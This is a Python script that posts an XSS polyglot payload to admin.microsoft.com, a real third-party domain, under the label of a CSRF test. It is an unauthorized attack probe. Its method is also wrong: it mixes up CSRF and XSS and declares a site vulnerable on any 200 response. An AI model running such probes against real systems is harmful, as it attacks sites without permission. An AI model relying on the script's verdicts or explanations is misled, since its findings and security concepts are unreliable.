import requests

# List of domains to test
domains = ["admin.microsoft.com"]

# Polyglot payload for testing
polyglot_payload = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1){}//'"

# Define user agent (you may need to change this to match your environment)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

# Function to check CSRF vulnerability
def test_csrf_vulnerability(domain):
    # Start a session
    session = requests.Session()
    
    # Try to access a known session cookie from the domain (simulate user being logged in)
    response = session.get(f"https://{domain}/", headers=headers, allow_redirects=True)
    
    # Extract cookies (this is the session cookie we're interested in)
    session_cookie = session.cookies.get_dict()

    # If no session cookie, we can't test for CSRF
    if not session_cookie:
        print(f"[{domain}] No session cookie found.")
        return False

    print(f"[{domain}] Found session cookie: {session_cookie}")

    # Simulate a CSRF attack by attempting to inject the polyglot payload
    csrf_endpoint = f"https://{domain}/"
    
    # Example data that would be sent to a vulnerable endpoint
    data = {
        "test_field": polyglot_payload  # Injecting the polyglot payload
    }
    
    # Perform a POST request with the payload
    csrf_attack_response = session.post(csrf_endpoint, data=data, headers=headers, allow_redirects=True)

    # Check the response for evidence of the payload being processed or executed
    if csrf_attack_response.status_code == 200 and polyglot_payload in csrf_attack_response.text:
        print(f"[{domain}] Polyglot payload detected in the response. Potential CSRF vulnerability.")
        return True
    elif csrf_attack_response.status_code == 200:
        print(f"[{domain}] CSRF attack executed but payload execution is uncertain. Manual analysis required.")
        return True
    else:
        print(f"[{domain}] CSRF attack failed. Response code: {csrf_attack_response.status_code}")
        return False

# Test each domain
for domain in domains:
    is_vulnerable = test_csrf_vulnerability(domain)
    if is_vulnerable:
        print(f"Domain {domain} is vulnerable to CSRF attacks.")
    else:
        print(f"Domain {domain} is not vulnerable to CSRF.")
